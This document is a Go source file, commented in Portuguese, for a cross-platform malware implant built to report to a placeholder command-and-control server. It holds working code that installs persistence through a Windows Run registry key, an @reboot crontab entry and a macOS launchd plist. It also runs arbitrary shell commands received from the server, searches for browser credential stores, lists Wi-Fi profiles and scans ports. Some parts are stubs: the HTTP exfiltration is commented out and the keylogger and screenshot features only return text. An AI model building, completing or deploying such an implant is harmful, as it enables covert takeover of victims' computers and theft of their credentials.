package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// Configuração do C2
const (
	C2Server     = "https://seu-servidor-c2.com/endpoint" // Substitua pelo seu servidor C2
	RegisterPath = "/register"
	DataPath     = "/data"
	CommandPath  = "/command"
	SleepTime    = 10 * time.Second
)

// Estrutura para comunicação com o C2
type C2Communication struct {
	AgentID   string
	Hostname  string
	IPAddress string
	OSInfo    string
}

// Estrutura para envio de dados ao C2
type DataPacket struct {
	AgentID string
	Type    string
	Data    string
}

// Estrutura para comandos do C2
type CommandResponse struct {
	Command  string
	Argument string
}

// Função principal
func main() {
	// Ocultando a janela do console (apenas Windows)
	if runtime.GOOS == "windows" {
		hideConsole()
	}

	// Registrando com o C2
	agentInfo := registerWithC2()
	
	// Instalando persistência
	installPersistence()
	
	// Coletando credenciais iniciais
	credentials := collectCredentials()
	sendDataToC2(agentInfo.AgentID, "credentials", string(credentials))
	
	// Coletando informações de rede
	networkInfo := collectNetworkInfo()
	sendDataToC2(agentInfo.AgentID, "network", string(networkInfo))
	
	// Loop principal para comunicação com C2
	for {
		// Buscando comandos do C2
		cmd := getCommandFromC2(agentInfo.AgentID)
		
		// Executando comando
		if cmd.Command != "" {
			output := executeCommand(cmd.Command, cmd.Argument)
			sendDataToC2(agentInfo.AgentID, "cmd_output", output)
		}
		
		// Esperando antes da próxima comunicação
		time.Sleep(SleepTime)
	}
}

// Oculta a janela do console no Windows
func hideConsole() {
	// Implementação específica para Windows
	// Nota: Em um ambiente real usaríamos syscalls ou compilação com flags específicas
}

// Registra o agente com o servidor C2
func registerWithC2() C2Communication {
	hostname, _ := os.Hostname()
	
	// Obtendo endereço IP local
	addrs, _ := net.InterfaceAddrs()
	ipAddress := "unknown"
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ipAddress = ipnet.IP.String()
				break
			}
		}
	}
	
	agentInfo := C2Communication{
		AgentID:   generateAgentID(),
		Hostname:  hostname,
		IPAddress: ipAddress,
		OSInfo:    runtime.GOOS + "/" + runtime.GOARCH,
	}
	
	// Enviando dados de registro para o C2
	// Em um cenário real, implementaríamos a comunicação HTTP aqui
	
	return agentInfo
}

// Gera um ID único para o agente
func generateAgentID() string {
	hostname, _ := os.Hostname()
	mac := getMACAddress()
	timestamp := time.Now().Unix()
	
	return fmt.Sprintf("%s-%s-%d", hostname, mac, timestamp)
}

// Obtém o endereço MAC da primeira interface de rede
func getMACAddress() string {
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, i := range interfaces {
			if i.HardwareAddr.String() != "" {
				return strings.Replace(i.HardwareAddr.String(), ":", "", -1)
			}
		}
	}
	return "unknown"
}

// Instala mecanismos de persistência no sistema
func installPersistence() {
	switch runtime.GOOS {
	case "windows":
		// Adiciona registro de inicialização (ou outro método de persistência)
		installWindowsPersistence()
	case "linux":
		// Adiciona ao crontab, systemd, etc.
		installLinuxPersistence()
	case "darwin":
		// Adiciona launchd plist no MacOS
		installMacPersistence()
	}
}

// Instala persistência no Windows
func installWindowsPersistence() {
	// Copia o executável para um local persistente
	exePath, _ := os.Executable()
	destPath := os.Getenv("APPDATA") + "\\SystemService.exe"
	
	// Copia apenas se não estiver já no destino
	if exePath != destPath {
		copyFile(exePath, destPath)
	}
	
	// Adicionando ao registro do Windows usando go-ole
	ole.CoInitialize(0)
	defer ole.CoUninitialize()
	
	unknown, _ := oleutil.CreateObject("WScript.Shell")
	wshell, _ := unknown.QueryInterface(ole.IID_IDispatch)
	defer wshell.Release()
	
	regPath := "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemService"
	_, _ = oleutil.CallMethod(wshell, "RegWrite", regPath, destPath, "REG_SZ")
}

// Instala persistência no Linux
func installLinuxPersistence() {
	// Copia o executável para um local persistente
	exePath, _ := os.Executable()
	destPath := "/tmp/.service"
	
	// Copia apenas se não estiver já no destino
	if exePath != destPath {
		copyFile(exePath, destPath)
		os.Chmod(destPath, 0755)
	}
	
	// Adiciona ao crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	
	cronJob := fmt.Sprintf("@reboot %s\n", destPath)
	
	// Se crontab já existe, adiciona a entrada
	if err == nil {
		if !strings.Contains(string(output), destPath) {
			newCron := string(output) + cronJob
			cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", newCron))
			cmd.Run()
		}
	} else {
		// Se não existe, cria um novo crontab
		cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", cronJob))
		cmd.Run()
	}
}

// Instala persistência no MacOS
func installMacPersistence() {
	// Copia o executável para um local persistente
	exePath, _ := os.Executable()
	destPath := fmt.Sprintf("/Users/%s/Library/LaunchAgents/.service", os.Getenv("USER"))
	
	// Copia apenas se não estiver já no destino
	if exePath != destPath {
		copyFile(exePath, destPath)
		os.Chmod(destPath, 0755)
	}
	
	// Criando plist para launchd
	plistPath := fmt.Sprintf("/Users/%s/Library/LaunchAgents/com.service.plist", os.Getenv("USER"))
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.service</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>`, destPath)
	
	ioutil.WriteFile(plistPath, []byte(plistContent), 0644)
	
	// Carregar o serviço
	exec.Command("launchctl", "load", plistPath).Run()
}

// Copia um arquivo de origem para destino
func copyFile(src, dst string) error {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, data, 0755)
}

// Coleta credenciais do sistema
func collectCredentials() []byte {
	var credData bytes.Buffer
	
	switch runtime.GOOS {
	case "windows":
		// Coleta senhas salvas do navegador, credenciais windows, etc.
		collectWindowsCredentials(&credData)
	case "linux":
		// Coleta credenciais de navegadores, arquivos shadow (se tiver permissão), etc.
		collectLinuxCredentials(&credData)
	case "darwin":
		// Coleta credenciais do keychain, navegadores no MacOS, etc.
		collectMacCredentials(&credData)
	}
	
	return credData.Bytes()
}

// Coleta credenciais no Windows
func collectWindowsCredentials(buffer *bytes.Buffer) {
	// Coleta de credenciais salvas do Chrome (exemplo)
	chromeDataPath := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
	if _, err := os.Stat(chromeDataPath); err == nil {
		// Aqui apenas registramos o path - em um cenário real teríamos que copiar o arquivo
		// e usar técnicas específicas para extrair os dados criptografados
		buffer.WriteString(fmt.Sprintf("Chrome credentials found at: %s\n", chromeDataPath))
	}
	
	// Lista de senhas wi-fi (exemplo não-invasivo)
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.Output()
	if err == nil {
		buffer.WriteString("Wi-Fi Profiles:\n")
		buffer.Write(output)
	}
	
	// Em um cenário real, implementaríamos métodos adicionais específicos
}

// Coleta credenciais no Linux
func collectLinuxCredentials(buffer *bytes.Buffer) {
	// Busca por arquivos de configuração de navegadores
	homeDir := os.Getenv("HOME")
	browserPaths := []string{
		"/Google/Chrome/",
		"/BraveSoftware/Brave-Browser/",
		"/.config/chromium/",
		"/.mozilla/firefox/",
	}
	
	buffer.WriteString("Browser profiles found:\n")
	
	for _, path := range browserPaths {
		fullPath := homeDir + path
		if _, err := os.Stat(fullPath); err == nil {
			buffer.WriteString(fmt.Sprintf("- %s\n", fullPath))
		}
	}
	
	// Em um cenário real, implementaríamos métodos adicionais específicos
}

// Coleta credenciais no MacOS
func collectMacCredentials(buffer *bytes.Buffer) {
	// Busca por arquivos de configuração de navegadores
	homeDir := os.Getenv("HOME")
	browserPaths := []string{
		"/Library/Application Support/Google/Chrome/",
		"/Library/Application Support/Firefox/",
		"/Library/Application Support/Brave/",
	}
	
	buffer.WriteString("Browser profiles found:\n")
	
	for _, path := range browserPaths {
		fullPath := homeDir + path
		if _, err := os.Stat(fullPath); err == nil {
			buffer.WriteString(fmt.Sprintf("- %s\n", fullPath))
		}
	}
	
	// Em um cenário real, implementaríamos métodos adicionais específicos
}

// Coleta informações de rede
func collectNetworkInfo() []byte {
	var netInfo bytes.Buffer
	
	// Informações de interface de rede
	netInfo.WriteString("--- Network Interfaces ---\n")
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		netInfo.WriteString(fmt.Sprintf("Name: %s\n", iface.Name))
		netInfo.WriteString(fmt.Sprintf("MAC: %s\n", iface.HardwareAddr))
		netInfo.WriteString(fmt.Sprintf("MTU: %d\n", iface.MTU))
		netInfo.WriteString(fmt.Sprintf("Flags: %v\n", iface.Flags))
		
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			netInfo.WriteString(fmt.Sprintf("Addr: %s\n", addr.String()))
		}
		netInfo.WriteString("\n")
	}
	
	// Rotas (depende do sistema)
	netInfo.WriteString("--- Routing Table ---\n")
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("route", "print")
		output, err := cmd.Output()
		if err == nil {
			netInfo.Write(output)
		}
	case "linux", "darwin":
		cmd := exec.Command("netstat", "-rn")
		output, err := cmd.Output()
		if err == nil {
			netInfo.Write(output)
		}
	}
	
	// ARP cache
	netInfo.WriteString("\n--- ARP Cache ---\n")
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("arp", "-a")
		output, err := cmd.Output()
		if err == nil {
			netInfo.Write(output)
		}
	case "linux", "darwin":
		cmd := exec.Command("arp", "-n")
		output, err := cmd.Output()
		if err == nil {
			netInfo.Write(output)
		}
	}
	
	return netInfo.Bytes()
}

// Envia dados para o servidor C2
func sendDataToC2(agentID, dataType, data string) {
	// Criando pacote de dados
	packet := DataPacket{
		AgentID: agentID,
		Type:    dataType,
		Data:    base64.StdEncoding.EncodeToString([]byte(data)),
	}
	
	// Convertendo para JSON
	jsonData, err := json.Marshal(packet)
	if err != nil {
		return
	}
	
	// Em um cenário real, implementaríamos a comunicação HTTP aqui
	// Por exemplo:
	// http.Post(C2Server+DataPath, "application/json", bytes.NewBuffer(jsonData))
	
	// Essa função simula o envio, em uma implementação real faríamos a requisição HTTP
	fmt.Printf("Sending %s data to C2\n", dataType)
}

// Busca comandos do servidor C2
func getCommandFromC2(agentID string) CommandResponse {
	var cmd CommandResponse
	
	// Em um cenário real, faríamos uma requisição HTTP para o C2
	// Por exemplo:
	// resp, err := http.Get(fmt.Sprintf("%s%s?id=%s", C2Server, CommandPath, agentID))
	// if err == nil && resp.StatusCode == 200 {
	//     body, _ := ioutil.ReadAll(resp.Body)
	//     json.Unmarshal(body, &cmd)
	// }
	
	// Simulando um comando do C2
	// Na implementação real, isso viria do servidor
	return cmd
}

// Executa um comando e retorna a saída
func executeCommand(command, argument string) string {
	var cmd *exec.Cmd
	
	switch command {
	case "shell":
		// Executa comando no shell
		switch runtime.GOOS {
		case "windows":
			cmd = exec.Command("cmd", "/c", argument)
		default:
			cmd = exec.Command("bash", "-c", argument)
		}
	case "download":
		// Baixa um arquivo do C2
		return downloadFile(argument)
	case "upload":
		// Envia um arquivo para o C2
		return uploadFile(argument)
	case "scan":
		// Escaneia portas na rede
		return scanPorts(argument)
	case "screenshot":
		// Captura tela
		return captureScreen()
	case "keylog":
		// Inicia/Para keylogger
		return toggleKeylogger(argument)
	default:
		return "Command not recognized"
	}
	
	if cmd != nil {
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Error: %s", err.Error())
		}
		return string(output)
	}
	
	return "Command execution failed"
}

// Simula o download de um arquivo do C2
func downloadFile(filePath string) string {
	// Em um cenário real, implementaríamos a comunicação HTTP aqui
	return fmt.Sprintf("Downloaded file to %s", filePath)
}

// Simula o upload de um arquivo para o C2
func uploadFile(filePath string) string {
	// Verifica se o arquivo existe
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return fmt.Sprintf("File %s not found", filePath)
	}
	
	// Em um cenário real, implementaríamos a comunicação HTTP aqui
	return fmt.Sprintf("Uploaded file %s to C2", filePath)
}

// Simula escaneamento de portas
func scanPorts(target string) string {
	var result bytes.Buffer
	result.WriteString(fmt.Sprintf("Port scan results for %s:\n", target))
	
	// Portas comuns para verificar
	ports := []int{21, 22, 23, 25, 53, 80, 443, 445, 3389, 8080}
	
	for _, port := range ports {
		address := fmt.Sprintf("%s:%d", target, port)
		conn, err := net.DialTimeout("tcp", address, 1*time.Second)
		
		if err == nil {
			result.WriteString(fmt.Sprintf("Port %d: OPEN\n", port))
			conn.Close()
		} else {
			result.WriteString(fmt.Sprintf("Port %d: closed\n", port))
		}
	}
	
	return result.String()
}

// Simula captura de tela
func captureScreen() string {
	// Em um sistema real, isso usaria bibliotecas específicas para cada OS
	return "Screenshot captured and saved"
}

// Simula ativação/desativação de keylogger
func toggleKeylogger(action string) string {
	// Em um sistema real, isso usaria bibliotecas específicas para cada OS
	if action == "start" {
		return "Keylogger started"
	} else {
		return "Keylogger stopped"
	}
}